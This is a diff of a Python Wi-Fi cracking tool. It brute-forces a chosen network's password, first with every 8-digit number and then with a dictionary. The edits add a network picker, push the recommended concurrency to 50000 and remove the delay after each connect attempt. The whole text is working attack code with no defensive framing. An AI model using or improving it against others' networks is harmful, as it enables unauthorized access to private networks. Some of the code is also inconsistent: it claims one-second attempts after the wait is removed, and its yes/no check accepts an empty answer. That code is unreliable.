@@ -20,10 +20,11 @@ def main() -> None:
 
 
 def get_max_workers() -> int:
+    print("Each connect attempt will take 1 second.")
     while True:
         try:
-            max_workers = int(input("Concurrent connect attempts (recommended: 10): "))
-            if max_workers > 15:
+            max_workers = int(input("Concurrent connect attempts (recommended: 50000): "))
+            if max_workers >= 100000:
                 warning("\nToo many concurrent attempts may cause memory overflow.")
                 if input("Are you sure about this? (Y/N) ").lower() in "yes": pass
                 else: continue
@@ -39,19 +40,23 @@ def get_profile(interface: Interface) -> Profile:
     sleep(3)
     results = interface.scan_results()
 
+    print("Networks in range:")
+    for index, network in enumerate(results):
+        print(f"{index + 1}. {network.ssid}")
+
     while True:
-        ssid = input("SSID: ")
-        for network in results:
-            if network.ssid == ssid:
-                info(f"Found SSID \"{ssid}\", attempting to connect.")
-                return interface.add_network_profile(network)
-        print(f"{ssid} is not within range.\nPlease try another SSID.")
+        try:
+            network = int(input(f"Choose network (1-{len(results)}): ")) - 1
+            return interface.add_network_profile(results[network])
+        except (ValueError, IndexError):
+            print(f"Invalid input. Please enter an integer in range from 1 to {len(results)}.")
 
 
 def disconnect(interface: Interface) -> None:
     for attempt in range(5):
         interface.disconnect()
         if interface.status() in (IFACE_DISCONNECTED, IFACE_INACTIVE):
+            print("Successfully disconnected from the current network.")
             return info("Successfully disconnected from the current network.")
         else: warning("\nFailed to disconnect from the current network. Retrying…")
     error("Failed to disconnect from the network after multiple attempts.")
@@ -61,7 +66,6 @@ def disconnect(interface: Interface) -> None:
 def connect(interface: Interface, profile: Profile, password: str) -> str | None:
     profile.key = password
     interface.connect(profile)
-    sleep(1)
     if interface.status() == IFACE_CONNECTED:
         info(f"Successfully connected with password: {password}")
         return password
@@ -72,7 +76,8 @@ def crack_wifi(interface: Interface, profile: Profile, max_workers: int) -> None
     disconnect(interface)
 
     info("Starting brute-force attack with 8-digit numbers.")
-    passwords = (str(number).zfill(8) for number in range(1_000_000_000))
+    print("Brute-forcing with 8-digit numbers…")
+    passwords = (str(number).zfill(8) for number in range(100_000_000))
     attempt_passwords(interface, profile, passwords, max_workers)
 
     info("8-digit numbers brute-force failed, trying dictionary attack…")
